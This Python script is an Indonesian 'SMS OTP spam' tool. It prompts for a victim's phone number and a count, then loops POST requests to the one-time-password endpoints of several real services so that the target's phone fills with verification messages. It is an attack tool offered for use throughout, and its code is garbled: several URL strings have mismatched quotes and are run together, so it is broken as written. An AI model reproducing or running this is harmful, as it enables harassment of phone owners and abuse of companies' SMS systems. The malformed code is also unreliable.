import json
from subprocess import call
from urllib import request

call(
	'clear'
)
print(""" 
	┏━━┓╋╋╋╋╋╋╋╋┏━┓╋╋┏━┓
	┃━━╋━┳━┓┏━━┓┃━╋━━┫━┫
	┣━━┃╋┃╋┗┫┃┃┃┣━┃┃┃┣━┃
	┗━━┫┏┻━━┻┻┻┛┗━┻┻┻┻━┛
	╋╋╋┗┛ github.com/CYBER-MODZ
		"""
)
print(
	'! contoh : 0823xxxxxx'
)
nomor=input(
	'+ nomor hp : '
)

while True:
	try:
		mex=int(
					input(
				'+ jumlah spam : '
			)
		)
		print(),;break
	except : continue
		
for max in range(mex):
	req = request.Request(
		'https://www.nutriclub.co.id/otp/?phone='+nomor+'&old_phone='+nomor, method="POST"
		'https://www.olx.co.id/api/auth/authenticate"
		'https://api.pizzahut.co.id/customer/v1/customer/register"
		'https://www.halodoc.com/api/v1/users/authentication/otp/requests"
		'https://beryllium.mapclub.com/api/sms/otp/registration"
	)
	r = json.loads(
				request.urlopen(
					req
				).read(
			)
		)
	if r['StatusCode']=='00':
		print(
					'['+str(
				max+1
			).zfill(2)+']'+' berhasil mengirim otp '+nomor[0:6]+'xxxx'
		)
	else:
		print(
					'['+str(
				max+1
			).zfill(2)+']'+' gagal mengirim otp '+nomor[0:6]+'xxxx'
		)
	__import__(
				"time"
			).sleep(
		2
	)